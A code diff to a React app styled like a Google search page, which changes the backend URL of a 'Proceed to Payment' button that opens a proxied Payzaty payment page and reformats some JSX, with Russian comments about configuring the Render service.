@@ -27,14 +27,16 @@ function App() {
     }
   };
 
-  // Используем продакшен URL (например, https://my-app.example.com/proxy-payzaty)
-const openPayzaty = () => {
-  window.open(
-    'https://my-backend.onrender.com/proxy-payzaty', 
-    '_blank', 
-    'noopener,noreferrer'
-  );
-};
+  // ВАЖНО: Замените "sgas-nlcb.onrender.com" на URL вашего сервиса Render
+  // где лежит server.js. Пример:
+  // "https://my-backend.onrender.com/proxy-payzaty"
+  const openPayzaty = () => {
+    window.open(
+      'https://sgas-nlcb.onrender.com/proxy-payzaty',
+      '_blank',
+      'noopener,noreferrer'
+    );
+  };
 
   return (
     <div className="min-h-screen bg-[#202124] text-gray-200" onClick={handlePageClick}>
@@ -99,8 +101,10 @@ const openPayzaty = () => {
               <div className="text-center text-gray-300 text-sm">
                 <p>You will be redirected to secure payment page</p>
               </div>
-              <button onClick={openPayzaty}
-                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg transition-colors flex items-center justify-center">
+              <button
+                onClick={openPayzaty}
+                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg transition-colors flex items-center justify-center"
+              >
                 <CreditCard className="w-5 h-5 mr-2" />
                 Proceed to Payment
               </button>
@@ -135,9 +139,13 @@ const openPayzaty = () => {
           <div className="relative">
             <div className="flex items-center bg-[#303134] rounded-full p-4 hover:bg-[#3c4043] transition-colors shadow-lg border border-gray-700">
               <Search className="w-5 h-5 text-gray-400 mr-3" />
-              <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)}
-                     className="flex-1 bg-transparent outline-none text-white placeholder-gray-400"
-                     placeholder="Search Google or type a URL" />
+              <input
+                type="text"
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+                className="flex-1 bg-transparent outline-none text-white placeholder-gray-400"
+                placeholder="Search Google or type a URL"
+              />
               <div className="flex items-center space-x-3">
                 <button className="p-2 hover:bg-gray-600 rounded-full transition-colors">
                   <Camera className="w-5 h-5 text-blue-400" />
